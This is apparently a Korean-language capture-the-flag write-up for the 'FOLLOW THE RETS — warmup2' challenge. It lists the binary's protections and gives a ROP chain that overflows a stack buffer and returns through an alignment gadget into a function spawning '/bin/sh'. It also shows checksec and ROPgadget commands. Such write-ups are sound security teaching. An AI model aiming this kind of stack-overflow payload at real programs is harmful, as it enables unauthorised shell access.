# FOLLOW THE RETS — warmup2

## 핵심 요약

`read(0, rsp, 0x200)`로 스택에 직접 입력을 받은 뒤 `add rsp, 0x28; ret`을 수행합니다. 저장된 RIP까지의 거리가 `0x28`바이트이므로, 패딩 뒤에 정렬용 `ret`과 `shell_code` 주소를 배치했습니다.

## 바이너리 정보

- No PIE
- NX enabled
- No stack canary
- Offset to saved RIP: `0x28`
- `ret` gadget: `0x401173`
- `shell_code`: `0x401320`

## ROP 체인

```text
b'A' * 0x28
    + p64(0x401173)   # stack alignment
    + p64(0x401320)   # shell_code → system("/bin/sh")
```

amd64 System V ABI에서는 함수 호출 지점의 스택 정렬이 중요합니다. `shell_code`로 곧장 반환하면 내부 `system()` 호출에서 정렬이 어긋날 수 있으므로, 단독 `ret` 가젯을 한 번 거쳐 16바이트 정렬을 맞췄습니다.

전체 코드는 [`../scripts/follow-the-rets.py`](../scripts/follow-the-rets.py)에 있습니다.

## 검증 명령

```bash
checksec --file ./challenge
nm -n ./challenge | less
ROPGadget --binary ./challenge | grep -E 'pop rdi|ret$'
```

원문에는 셸 획득 사실만 기록되어 있으며 최종 플래그 값은 없습니다.

